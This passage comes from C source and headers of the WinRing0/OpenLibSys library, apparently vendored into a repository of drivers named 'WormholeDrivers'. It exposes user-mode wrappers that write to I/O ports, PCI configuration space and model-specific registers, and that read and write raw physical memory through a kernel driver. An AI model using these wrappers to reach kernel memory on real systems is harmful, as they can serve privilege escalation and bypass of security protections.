						 sizeof(inBuf.LongData);

	result = DeviceIoControl(
						gHandle,
						IOCTL_OLS_WRITE_IO_PORT_DWORD,
						&inBuf,
						length,
						NULL,
						0,
						&returnedLength,
						NULL
						);
	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

//-----------------------------------------------------------------------------
//
// PCI Configuration Read
//
//-----------------------------------------------------------------------------

BOOL pciConfigRead(DWORD pciAddress, DWORD regAddress, PBYTE value, DWORD size, PDWORD error)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	if(value == NULL)
	{
		return FALSE;
	}
	// alignment check
	if(size == 2 && (regAddress & 1) != 0)
	{
		return FALSE;
	}
	if(size == 4 && (regAddress & 3) != 0)
	{
		return FALSE;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	OLS_READ_PCI_CONFIG_INPUT inBuf;

	inBuf.PciAddress = pciAddress;
	inBuf.PciOffset = regAddress;

	result = DeviceIoControl(
                            gHandle,
                            IOCTL_OLS_READ_PCI_CONFIG,
                            &inBuf,
                            sizeof(inBuf),
                            value,
                            size,
                            &returnedLength,
                            NULL
                            );

	if(error != NULL)
	{
		*error = GetLastError();
	}

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

//-----------------------------------------------------------------------------
// PCI Configuration Read (No Error Check)
//-----------------------------------------------------------------------------

BYTE WINAPI ReadPciConfigByte(DWORD pciAddress, BYTE regAddress)
{
	BYTE ret;
	if(pciConfigRead(pciAddress, regAddress, (PBYTE)&ret, sizeof(ret), NULL))
	{
		return ret;
	}
	else
	{
		return 0xFF;
	}
}

WORD WINAPI ReadPciConfigWord(DWORD pciAddress, BYTE regAddress)
{
	WORD ret;
	if(pciConfigRead(pciAddress, regAddress, (PBYTE)&ret, sizeof(ret), NULL))
	{
		return ret;
	}
	else
	{
		return 0xFFFF;
	}
}

DWORD WINAPI ReadPciConfigDword(DWORD pciAddress, BYTE regAddress)
{
	DWORD ret;
	if(pciConfigRead(pciAddress, regAddress, (PBYTE)&ret, sizeof(ret), NULL))
	{
		return ret;
	}
	else
	{
		return 0xFFFFFFFF;
	}
}

//-----------------------------------------------------------------------------
// PCI Configuration Read (Error Check)
//-----------------------------------------------------------------------------

BOOL WINAPI ReadPciConfigByteEx(DWORD pciAddress, DWORD regAddress, PBYTE value)
{
	return pciConfigRead(pciAddress, regAddress, (PBYTE)value, sizeof(BYTE), NULL);
}

BOOL WINAPI ReadPciConfigWordEx(DWORD pciAddress, DWORD regAddress, PWORD value)
{
	return pciConfigRead(pciAddress, regAddress, (PBYTE)value, sizeof(WORD), NULL);
}

BOOL WINAPI ReadPciConfigDwordEx(DWORD pciAddress, DWORD regAddress, PDWORD value)
{
	return pciConfigRead(pciAddress, regAddress, (PBYTE)value, sizeof(DWORD), NULL);
}

//-----------------------------------------------------------------------------
//
// PCI Configuration Write
//
//-----------------------------------------------------------------------------

BOOL pciConfigWrite(DWORD pciAddress, DWORD regAddress, PBYTE value, DWORD size)
{
	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	int		inputSize = 0;
	OLS_WRITE_PCI_CONFIG_INPUT	*inBuf;

	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}
	if(value == NULL)
	{
		return FALSE;
	}
	// alignment check
	if(size == 2 && (regAddress & 1) != 0)
	{
		return FALSE;
	}
	if(size == 4 && (regAddress & 3) != 0)
	{
		return FALSE;
	}

	inputSize = offsetof(OLS_WRITE_PCI_CONFIG_INPUT, Data) + size;
	inBuf = (OLS_WRITE_PCI_CONFIG_INPUT*)malloc(inputSize);
	if(inBuf == NULL)
	{
		return FALSE;
	}
	memcpy(inBuf->Data, value, size);
	inBuf->PciAddress = pciAddress;
	inBuf->PciOffset = regAddress;
	result = DeviceIoControl(
                            gHandle,
                            IOCTL_OLS_WRITE_PCI_CONFIG,
                            inBuf,
                            inputSize,
                            NULL,
                            0,
                            &returnedLength,
                            NULL
                            );
	free(inBuf);

	if(result)
	{
		return TRUE;
	}
	else
	{
		return FALSE;
	}
}

//-----------------------------------------------------------------------------
// PCI Configuration Write (No Error Check)
//-----------------------------------------------------------------------------

VOID WINAPI WritePciConfigByte(DWORD pciAddress, BYTE regAddress, BYTE value)
{
	pciConfigWrite(pciAddress, regAddress, (PBYTE)&value , sizeof(value));
}

VOID WINAPI WritePciConfigWord(DWORD pciAddress, BYTE regAddress, WORD value)
{
	pciConfigWrite(pciAddress, regAddress, (PBYTE)&value , sizeof(value));
}

VOID WINAPI WritePciConfigDword(DWORD pciAddress, BYTE regAddress, DWORD value)
{
	pciConfigWrite(pciAddress, regAddress, (PBYTE)&value , sizeof(value));
}

//-----------------------------------------------------------------------------
// PCI Configuration Write (Error Check)
//-----------------------------------------------------------------------------

BOOL WINAPI WritePciConfigByteEx(DWORD pciAddress, DWORD regAddress, BYTE value)
{
	return pciConfigWrite(pciAddress, regAddress, (PBYTE)&value , sizeof(value));
}

BOOL WINAPI WritePciConfigWordEx(DWORD pciAddress, DWORD regAddress, WORD value)
{
	return pciConfigWrite(pciAddress, regAddress, (PBYTE)&value , sizeof(value));
}

BOOL WINAPI WritePciConfigDwordEx(DWORD pciAddress, DWORD regAddress, DWORD value)
{
	return pciConfigWrite(pciAddress, regAddress, (PBYTE)&value , sizeof(value));
}

//-----------------------------------------------------------------------------
//
// FindPciDevice
//
//-----------------------------------------------------------------------------

VOID WINAPI SetPciMaxBusIndex(BYTE max)
{
	gPciMaxNumberOfBus = max;
}

DWORD WINAPI FindPciDeviceById(WORD vendorId, WORD deviceId, BYTE index)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0xFFFFFFFF;
	}

	DWORD bus = 0, dev = 0, func = 0;
	DWORD count = 0;
	DWORD pciAddress = 0xFFFFFFFF;
	DWORD id = 0;
	DWORD error = 0;	
	BOOL multiFuncFlag = FALSE;
	BYTE type = 0;
	count = 0;

	if(vendorId == 0xFFFF)
	{
		return 0xFFFFFFFF;
	}

	for(bus = 0; bus <= gPciMaxNumberOfBus; bus++)
	{
		for(dev = 0; dev < gPciNumberOfDevice; dev++)
		{
			multiFuncFlag = FALSE;
			for(func = 0; func < gPciNumberOfFunction; func++)
			{
				if(multiFuncFlag == 0 && func > 0)
				{
					break;
				}

				pciAddress = PciBusDevFunc(bus, dev, func);
				if(pciConfigRead(pciAddress, 0, (PBYTE)&id, sizeof(id), &error))
				{
					if(func == 0) // Is Multi Function Device
					{
						if(pciConfigRead(pciAddress, 0x0E, (PBYTE)&type, sizeof(type), NULL))
						{
							if(type & 0x80)
							{
								multiFuncFlag = TRUE;
							}
						}
					}

					if(id == (vendorId | ((DWORD)deviceId << 16)))
					{
						if(count == index) 
						{
							return pciAddress;
						}
						count++;
						continue;
					}
				}
				/*
				else if(error == OLS_ERROR_PCI_BUS_NOT_EXIST)
				{
					break; 
				}
				else if(error == OLS_ERROR_PCI_NO_DEVICE && func == 0)
				{
					break;
				}
				*/
			}
		}
	}
	return 0xFFFFFFFF;
}

DWORD WINAPI FindPciDeviceByClass(BYTE baseClass, BYTE subClass, BYTE programIf, BYTE index)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0xFFFFFFFF;
	}

	DWORD bus = 0, dev = 0, func = 0;
	DWORD count = 0;
	DWORD pciAddress = 0xFFFFFFFF;
	DWORD conf[3] = {0};
	DWORD error = 0;	
	BOOL multiFuncFlag = FALSE;
	BYTE type = 0;
	count = 0;

	for(bus = 0; bus <= gPciMaxNumberOfBus; bus++)
	{
		for(dev = 0; dev < gPciNumberOfDevice; dev++)
		{
			multiFuncFlag = FALSE;
			for(func = 0; func < gPciNumberOfFunction; func++)
			{
				if(multiFuncFlag == FALSE && func > 0)
				{
					break;
				}
				pciAddress = PciBusDevFunc(bus, dev, func);
				if(pciConfigRead(pciAddress, 0, (BYTE*)conf, sizeof(conf), &error))
				{
					if(func == 0) // Is Multi Function Device
					{ 
						if(pciConfigRead(pciAddress, 0x0E, (BYTE*)&type, sizeof(type), NULL))
						{
							if(type & 0x80)
							{
								multiFuncFlag = TRUE;
							}
						}
					}
					if((conf[2] & 0xFFFFFF00) == 
							(((DWORD)baseClass << 24) |
							((DWORD)subClass << 16) |
							((DWORD)programIf << 8))
						)
					{
						if(count == index)
						{
							return pciAddress;
						}
						count++;
						continue;
					}
				}
				/*
				else if(error == OLS_ERROR_PCI_BUS_NOT_EXIST)
				{
					break;
				}
				else if(error == OLS_ERROR_PCI_NO_DEVICE && func == 0)
				{
					break;
				}
				*/
			}
		}
	}
	return 0xFFFFFFFF;
}

//-----------------------------------------------------------------------------
//
// Physical Memory
//
//-----------------------------------------------------------------------------
#ifdef _PHYSICAL_MEMORY_SUPPORT
DWORD WINAPI ReadDmiMemory(PBYTE buffer, DWORD count, DWORD unitSize)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	if(buffer == NULL)
	{
		return 0;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD	size = 0;
	OLS_READ_MEMORY_INPUT inBuf;

	if(sizeof(DWORD_PTR) == 4)
	{
		inBuf.Address.HighPart = 0;
		inBuf.Address.LowPart = (DWORD)0x000F0000;
	}
	else
	{
		inBuf.Address.QuadPart = 0x000F0000;
	}

	inBuf.UnitSize = unitSize;
	inBuf.Count = count;
	size = inBuf.UnitSize * inBuf.Count;

	if(size > 65536)
	{
		return 0;
	}

    result = DeviceIoControl(
                        gHandle,
                        IOCTL_OLS_READ_MEMORY,
                        &inBuf,
                        sizeof(OLS_READ_MEMORY_INPUT),
                        buffer,
                        size,
                        &returnedLength,
                        NULL
                        );

    if(result && returnedLength == size)
	{
		return count * unitSize;
	}
	else
	{
		return 0;
	}
}

DWORD WINAPI ReadPhysicalMemory(DWORD_PTR address, PBYTE buffer, DWORD count, DWORD unitSize)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	if(buffer == NULL)
	{
		return 0;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD	size = 0;
	OLS_READ_MEMORY_INPUT inBuf;

	if(sizeof(DWORD_PTR) == 4)
	{
		inBuf.Address.HighPart = 0;
		inBuf.Address.LowPart = (DWORD)address;
	}
	else
	{
		inBuf.Address.QuadPart = address;
	}

	inBuf.UnitSize = unitSize;
	inBuf.Count = count;
	size = inBuf.UnitSize * inBuf.Count;

    result = DeviceIoControl(
                        gHandle,
                        IOCTL_OLS_READ_MEMORY,
                        &inBuf,
                        sizeof(OLS_READ_MEMORY_INPUT),
                        buffer,
                        size,
                        &returnedLength,
                        NULL
                        );

    if(result && returnedLength == size)
	{
		return count * unitSize;
	}
	else
	{
		return 0;
	}
}

DWORD WINAPI WritePhysicalMemory(DWORD_PTR address, PBYTE buffer, DWORD count, DWORD unitSize)
{
	if(gHandle == INVALID_HANDLE_VALUE)
	{
		return 0;
	}

	if(buffer == NULL)
	{
		return 0;
	}

	DWORD	returnedLength = 0;
	BOOL	result = FALSE;
	DWORD	size = 0;
	DWORD	rCode = 0;
	OLS_WRITE_MEMORY_INPUT *inBuf;

	size = offsetof(OLS_WRITE_MEMORY_INPUT, Data) + count * unitSize;
	inBuf = (OLS_WRITE_MEMORY_INPUT*)malloc(size);
	if(sizeof(DWORD_PTR) == 4)
	{
		inBuf->Address.HighPart = 0;
		inBuf->Address.LowPart = (DWORD)address;
	}
	else
	{
		inBuf->Address.QuadPart = address;
	}
	inBuf->UnitSize = unitSize;
	inBuf->Count = count;
	memcpy(&inBuf->Data, buffer, count * unitSize);

    result = DeviceIoControl(
                        gHandle,
                        IOCTL_OLS_WRITE_MEMORY,
                        inBuf,     
                        size,
                        NULL,
                        0,
                        &returnedLength,
                        NULL
                        );
    if(result)
	{
		rCode = count * unitSize;
	}
	else
	{
		rCode = 0;
	}

	free(inBuf);

	return rCode;
}
#endif
```

`source/WormholeDrivers/WINRING0/dll/OlsApi.def`:

```def
EXPORTS 

GetDllStatus			@1
GetDllVersion			@2
GetDriverVersion		@3
GetDriverType			@4

InitializeOls			@7
DeinitializeOls			@8

IsCpuid					@11
IsMsr					@12
IsTsc					@13

Hlt						@20
Rdmsr					@21
Wrmsr					@22
Rdpmc					@23
Cpuid					@24
Rdtsc					@25

HltTx					@30
RdmsrTx					@31
WrmsrTx					@32
RdpmcTx					@33
CpuidTx					@34
RdtscTx					@35

HltPx					@40
RdmsrPx					@41
WrmsrPx					@42
RdpmcPx					@43
CpuidPx					@44
RdtscPx					@45

ReadIoPortByte			@51
ReadIoPortWord			@52
ReadIoPortDword			@53
WriteIoPortByte			@54
WriteIoPortWord			@55
WriteIoPortDword		@56

ReadIoPortByteEx		@61
ReadIoPortWordEx		@62
ReadIoPortDwordEx		@63
WriteIoPortByteEx		@64
WriteIoPortWordEx		@65
WriteIoPortDwordEx		@66

SetPciMaxBusIndex		@70

ReadPciConfigByte		@81
ReadPciConfigWord		@82
ReadPciConfigDword		@83
WritePciConfigByte		@84
WritePciConfigWord		@85
WritePciConfigDword		@86
FindPciDeviceById		@87
FindPciDeviceByClass	@88

ReadPciConfigByteEx		@91
ReadPciConfigWordEx		@92
ReadPciConfigDwordEx	@93
WritePciConfigByteEx	@94
WritePciConfigWordEx	@95
WritePciConfigDwordEx	@96

;ReadDmiMemory			@100
;ReadPhysicalMemory     @101
;WritePhysicalMemory    @102

```

`source/WormholeDrivers/WINRING0/dll/OlsApi.h`:

```h
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                     Copyright 2007-2009 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------
// for WinRing0 1.3.x

#pragma once

/******************************************************************************
**
** DLL Information
**
******************************************************************************/

//-----------------------------------------------------------------------------
// GetDllStatus
//-----------------------------------------------------------------------------
DWORD // DLL Status, defined OLS_DLL_****
WINAPI GetDllStatus();

//-----------------------------------------------------------------------------
// GetDllVersion
//-----------------------------------------------------------------------------
DWORD // DLL Version, defined OLS_VERSION
WINAPI GetDllVersion(
	PBYTE major,		// major version
	PBYTE minor,		// minor version
	PBYTE revision,		// revision
	PBYTE release		// release/build
);

//-----------------------------------------------------------------------------
// GetDriverVersion
//-----------------------------------------------------------------------------
DWORD // Device Driver Version, defined OLS_DRIVER_VERSION
WINAPI GetDriverVersion(
	PBYTE major,		// major version
	PBYTE minor,		// minor version
	PBYTE revision,		// revision
	PBYTE release		// release/build
);

//-----------------------------------------------------------------------------
// GetDriverType
//-----------------------------------------------------------------------------
DWORD // Device Driver Type, defined OLS_DRIVER_TYPE_****
WINAPI GetDriverType();

//-----------------------------------------------------------------------------
// InitializeOls
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI InitializeOls();

//-----------------------------------------------------------------------------
// DeinitializeOls
//-----------------------------------------------------------------------------
VOID WINAPI DeinitializeOls();

/******************************************************************************
**
** CPU
**
******************************************************************************/

//-----------------------------------------------------------------------------
// IsCpuid
//-----------------------------------------------------------------------------
BOOL // TRUE: support CPUID instruction, FALSE: not support CPUID instruction
WINAPI IsCpuid();

//-----------------------------------------------------------------------------
// IsMsr
//-----------------------------------------------------------------------------
BOOL // TRUE: support MSR(Model-Specific Register), FALSE: not support MSR
WINAPI IsMsr();

//-----------------------------------------------------------------------------
// IsTsc
//-----------------------------------------------------------------------------
BOOL // TRUE: support TSC(Time Stamp Counter), FALSE: not support TSC
WINAPI IsTsc();

//-----------------------------------------------------------------------------
// Rdmsr
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI Rdmsr(
	DWORD index,					// MSR index
	PDWORD eax,						// bit  0-31
	PDWORD edx						// bit 32-63
);

//-----------------------------------------------------------------------------
// RdmsrTx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI RdmsrTx(
	DWORD index,					// MSR index
	PDWORD eax,						// bit  0-31
	PDWORD edx,						// bit 32-63
	DWORD_PTR threadAffinityMask
);

//-----------------------------------------------------------------------------
// RdmsrPx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI RdmsrPx(
	DWORD index,					// MSR index
	PDWORD eax,						// bit  0-31
	PDWORD edx,						// bit 32-63
	DWORD_PTR processAffinityMask
);

//-----------------------------------------------------------------------------
// Wrmsr
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI Wrmsr(
	DWORD index,					// MSR index
	DWORD eax,						// bit  0-31
	DWORD edx						// bit 32-63
);

//-----------------------------------------------------------------------------
// WrmsrTx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI WrmsrTx(
	DWORD index,					// MSR index
	DWORD eax,						// bit  0-31
	DWORD edx,						// bit 32-63
	DWORD_PTR threadAffinityMask
);

//-----------------------------------------------------------------------------
// WrmsrPx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI WrmsrPx(
	DWORD index,					// MSR index
	DWORD eax,						// bit  0-31
	DWORD edx,						// bit 32-63
	DWORD_PTR processAffinityMask
);

//-----------------------------------------------------------------------------
// Rdpmc
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI Rdpmc(
	DWORD index,					// PMC index
	PDWORD eax,						// bit  0-31
	PDWORD edx						// bit 32-63
);

//-----------------------------------------------------------------------------
// RdmsrTx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI RdpmcTx(
	DWORD index,					// PMC index
	PDWORD eax,						// bit  0-31
	PDWORD edx,						// bit 32-63
	DWORD_PTR threadAffinityMask
);

//-----------------------------------------------------------------------------
// RdmsrPx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI RdpmcPx(
	DWORD index,					// PMC index
	PDWORD eax,						// bit  0-31
	PDWORD edx,						// bit 32-63
	DWORD_PTR processAffinityMask
);

//-----------------------------------------------------------------------------
// Cpuid
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI Cpuid(
	DWORD index,					// CPUID index
	PDWORD eax,
	PDWORD ebx,
	PDWORD ecx,
	PDWORD edx
);

//-----------------------------------------------------------------------------
// CpuidTx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI CpuidTx(
	DWORD index,					// CPUID index
	PDWORD eax,
	PDWORD ebx,
	PDWORD ecx,
	PDWORD edx,
	DWORD_PTR threadAffinityMask
);

//-----------------------------------------------------------------------------
// CpuidPx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI CpuidPx(
	DWORD index,					// CPUID index
	PDWORD eax,
	PDWORD ebx,
	PDWORD ecx,
	PDWORD edx,
	DWORD_PTR processAffinityMask
);

//-----------------------------------------------------------------------------
// Rdtsc
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI Rdtsc(
	PDWORD eax,						// bit  0-31
	PDWORD edx						// bit 32-63
);

//-----------------------------------------------------------------------------
// RdmsrTx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI RdtscTx(
	PDWORD eax,						// bit  0-31
	PDWORD edx,						// bit 32-63
	DWORD_PTR threadAffinityMask
);

//-----------------------------------------------------------------------------
// RdmsrPx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI RdtscPx(
	PDWORD eax,						// bit  0-31
	PDWORD edx,						// bit 32-63
	DWORD_PTR processAffinityMask
);

//-----------------------------------------------------------------------------
// Hlt
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI Hlt();

//-----------------------------------------------------------------------------
// HltTx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI HltTx(
	DWORD_PTR threadAffinityMask
);

//-----------------------------------------------------------------------------
// HltPx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI HltTx(
	DWORD_PTR processAffinityMask
);

/******************************************************************************
**
** I/O
**
******************************************************************************/

//-----------------------------------------------------------------------------
// ReadIoPortByte
//-----------------------------------------------------------------------------
BYTE // Read Value
WINAPI ReadIoPortByte(
	WORD port			// I/O port address
);

//-----------------------------------------------------------------------------
// ReadIoPortWord
//-----------------------------------------------------------------------------
WORD // Read Value
WINAPI ReadIoPortWord(
	WORD port			// I/O port address
);

//-----------------------------------------------------------------------------
// ReadIoPortDword
//-----------------------------------------------------------------------------
DWORD // Read Value
WINAPI ReadIoPortDword(
	WORD port			// I/O port address
);

//-----------------------------------------------------------------------------
// ReadIoPortByteEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI ReadIoPortByteEx(
	WORD port,			// I/O port address
	PBYTE value			// Read Value
);
//-----------------------------------------------------------------------------
// ReadIoPortWordEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI ReadIoPortWordEx(
	WORD port,			// I/O port address
	PWORD value			// Read Value
);
//-----------------------------------------------------------------------------
// ReadIoPortDwordEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI ReadIoPortDwordEx(
	WORD port,			// I/O port address
	PDWORD value		// Read Value
);

//-----------------------------------------------------------------------------
// WriteIoPortByte
//-----------------------------------------------------------------------------
VOID
WINAPI WriteIoPortByte(
	WORD port,			// I/O port address
	BYTE value			// Write Value
);

//-----------------------------------------------------------------------------
// WriteIoPortDword
//-----------------------------------------------------------------------------
VOID
WINAPI WriteIoPortDword(
	WORD port,			// I/O port address
	DWORD value			// Write Value
);


//-----------------------------------------------------------------------------
// WriteIoPortWord
//-----------------------------------------------------------------------------
VOID 
WINAPI WriteIoPortWord(
	WORD port,			// I/O port address
	WORD value			// Write Value
);

//-----------------------------------------------------------------------------
// WriteIoPortByteEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI WriteIoPortByteEx(
	WORD port,			// I/O port address
	BYTE value			// Write Value
);

//-----------------------------------------------------------------------------
// WriteIoPortWordEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI WriteIoPortWordEx(
	WORD port,			// I/O port address
	WORD value			// Write Value
);


//-----------------------------------------------------------------------------
// WriteIoPortDwordEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI WriteIoPortDwordEx(
	WORD port,			// I/O port address
	DWORD value			// Write Value
);

/******************************************************************************
**
** PCI
**
******************************************************************************/
// pciAddress
//  0- 2: Function Number
//  3- 7: Device Number
//  8-15: PCI Bus Number
// 16-31: Reserved
// 0xFFFFFFFF : Error

//-----------------------------------------------------------------------------
// SetPciMaxBusNo
//-----------------------------------------------------------------------------
VOID
WINAPI SetPciMaxBusIndex(
	BYTE max			// Max PCI Bus to Scan
);

//-----------------------------------------------------------------------------
// ReadPciConfigByte
//-----------------------------------------------------------------------------
BYTE // Read Value
WINAPI ReadPciConfigByte(
	DWORD pciAddress,	// PCI Device Address
	BYTE regAddress		// Configuration Address 0-255
);

//-----------------------------------------------------------------------------
// ReadPciConfigWord
//-----------------------------------------------------------------------------
WORD // Read Value
WINAPI ReadPciConfigWord(
	DWORD pciAddress,	// PCI Device Address
	BYTE regAddress		// Configuration Address 0-255
);

//-----------------------------------------------------------------------------
// ReadPciConfigDword
//-----------------------------------------------------------------------------
DWORD // Read Value
WINAPI ReadPciConfigDword(
	DWORD pciAddress,	// PCI Device Address
	BYTE regAddress		// Configuration Address 0-255
);

//-----------------------------------------------------------------------------
// ReadPciConfigByteEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI ReadPciConfigByteEx(
	DWORD pciAddress,	// PCI Device Address
	DWORD regAddress,	// Configuration Address 0-whatever
	PBYTE value			// Read Value
);

//-----------------------------------------------------------------------------
// ReadPciConfigWordEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI ReadPciConfigWordEx(
	DWORD pciAddress,	// PCI Device Address
	DWORD regAddress,	// Configuration Address 0-whatever
	PWORD value			// Read Value
);

//-----------------------------------------------------------------------------
// ReadPciConfigDwordEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI ReadPciConfigDwordEx(
	DWORD pciAddress,	// PCI Device Address
	DWORD regAddress,	// Configuration Address 0-whatever
	PDWORD value		// Read Value
);

//-----------------------------------------------------------------------------
// WritePciConfigByte
//-----------------------------------------------------------------------------
VOID
WINAPI WritePciConfigByte(
	DWORD pciAddress,	// PCI Device Address
	BYTE regAddress,	// Configuration Address 0-255
	BYTE value			// Write Value
);

//-----------------------------------------------------------------------------
// WritePciConfigWord
//-----------------------------------------------------------------------------
VOID
WINAPI WritePciConfigWord(
	DWORD pciAddress,	// PCI Device Address
	BYTE regAddress,	// Configuration Address 0-255
	WORD value			// Write Value
);

//-----------------------------------------------------------------------------
// WritePciConfigDword
//-----------------------------------------------------------------------------
VOID
WINAPI WritePciConfigDword(
	DWORD pciAddress,	// PCI Device Address
	BYTE regAddress,	// Configuration Address 0-255
	DWORD value			// Write Value
);

//-----------------------------------------------------------------------------
// WritePciConfigByteEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI WritePciConfigByteEx(
	DWORD pciAddress,	// PCI Device Address
	DWORD regAddress,	// Configuration Address 0-whatever
	BYTE value			// Write Value
);

//-----------------------------------------------------------------------------
// WritePciConfigWordEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI WritePciConfigWordEx(
	DWORD pciAddress,	// PCI Device Address
	DWORD regAddress,	// Configuration Address 0-whatever
	WORD value			// Write Value
);

//-----------------------------------------------------------------------------
// WritePciConfigDwordEx
//-----------------------------------------------------------------------------
BOOL // TRUE: success, FALSE: failure
WINAPI WritePciConfigDwordEx(
	DWORD pciAddress,	// PCI Device Address
	DWORD regAddress,	// Configuration Address 0-whatever
	DWORD value			// Write Value
);

//-----------------------------------------------------------------------------
// FindPciDeviceById
//-----------------------------------------------------------------------------
DWORD // pciAddress, 0xFFFFFFFF: failure
WINAPI FindPciDeviceById(
	WORD vendorId,		// Vendor ID
	WORD deviceId,		// Device ID
	BYTE index			// Index
);

//-----------------------------------------------------------------------------
// FindPciDeviceByClass
//-----------------------------------------------------------------------------
DWORD // pciAddress, 0xFFFFFFFF: failure
WINAPI FindPciDeviceByClass(
	BYTE baseClass,		// Base Class
	BYTE subClass,		// Sub Class
	BYTE programIf,		// Program Interface
	BYTE index			// Index
);

/******************************************************************************
**
** Memory (Special API)
**
******************************************************************************/

#ifdef _PHYSICAL_MEMORY_SUPPORT
//-----------------------------------------------------------------------------
// ReadDmiMemory
//-----------------------------------------------------------------------------
DWORD // Read size(byte), 0: failure
WINAPI ReadDmiMemory(
	PBYTE buffer,		// Buffer
	DWORD count,		// Count
	DWORD unitSize		// Unit Size (BYTE, WORD, DWORD)
);

//-----------------------------------------------------------------------------
// ReadPhysicalMemory
//-----------------------------------------------------------------------------
DWORD // Read size(byte), 0: failure
WINAPI ReadPhysicalMemory(
	DWORD_PTR address,	// Physical Memory Address
	PBYTE buffer,		// Buffer
	DWORD count,		// Count
	DWORD unitSize		// Unit Size (BYTE, WORD, DWORD)
);

//-----------------------------------------------------------------------------
// WritePhysicalMemory
//-----------------------------------------------------------------------------
DWORD // Write size(byte), 0: failure
WINAPI WritePhysicalMemory(
	DWORD_PTR address,	// Physical Memory Address
	PBYTE buffer,		// Buffer
	DWORD count,		// Count
	DWORD unitSize		// Unit Size (BYTE, WORD, DWORD)
);
#endif
```

`source/WormholeDrivers/WINRING0/dll/OlsApiInit.h`:

```h
//-----------------------------------------------------------------------------
//     Author : hiyohiyo
//       Mail : hiyohiyo@crystalmark.info
//        Web : http://openlibsys.org/
//    License : The modified BSD license
//
//                     Copyright 2007-2009 OpenLibSys.org. All rights reserved.
//-----------------------------------------------------------------------------
// for WinRing0 1.3.x

#pragma once

#include "OlsDef.h"
#include "OlsApiInitDef.h"

//-----------------------------------------------------------------------------
//
// Prototypes
//
//-----------------------------------------------------------------------------

BOOL InitOpenLibSys(HMODULE *hModule);
BOOL DeinitOpenLibSys(HMODULE *hModule);

//-----------------------------------------------------------------------------
//
// Funtions
//
//-----------------------------------------------------------------------------

// DLL
_GetDllStatus GetDllStatus = NULL;
_GetDllVersion GetDllVersion = NULL;
_GetDriverVersion GetDriverVersion = NULL;
_GetDriverType GetDriverType = NULL;

_InitializeOls InitializeOls = NULL;
_DeinitializeOls DeinitializeOls = NULL;

// CPU
_IsCpuid IsCpuid = NULL;
_IsMsr IsMsr = NULL;
_IsTsc IsTsc = NULL;

_Hlt Hlt = NULL;
_Rdmsr Rdmsr = NULL;
_Wrmsr Wrmsr = NULL;
_Rdpmc Rdpmc = NULL;
_Cpuid Cpuid = NULL;
_Rdtsc Rdtsc = NULL;

_HltTx HltTx = NULL;
_RdmsrTx RdmsrTx = NULL;
_WrmsrTx WrmsrTx = NULL;
_RdpmcTx RdpmcTx = NULL;
_CpuidTx CpuidTx = NULL;
_RdtscTx RdtscTx = NULL;

_HltPx HltPx = NULL;
_RdmsrPx RdmsrPx = NULL;
_WrmsrPx WrmsrPx = NULL;
_RdpmcPx RdpmcPx = NULL;
_CpuidPx CpuidPx = NULL;
_RdtscPx RdtscPx = NULL;

// I/O
_ReadIoPortByte ReadIoPortByte = NULL;
_ReadIoPortWord ReadIoPortWord = NULL;
_ReadIoPortDword ReadIoPortDword = NULL;

_ReadIoPortByteEx ReadIoPortByteEx = NULL;
_ReadIoPortWordEx ReadIoPortWordEx = NULL;
_ReadIoPortDwordEx ReadIoPortDwordEx = NULL;

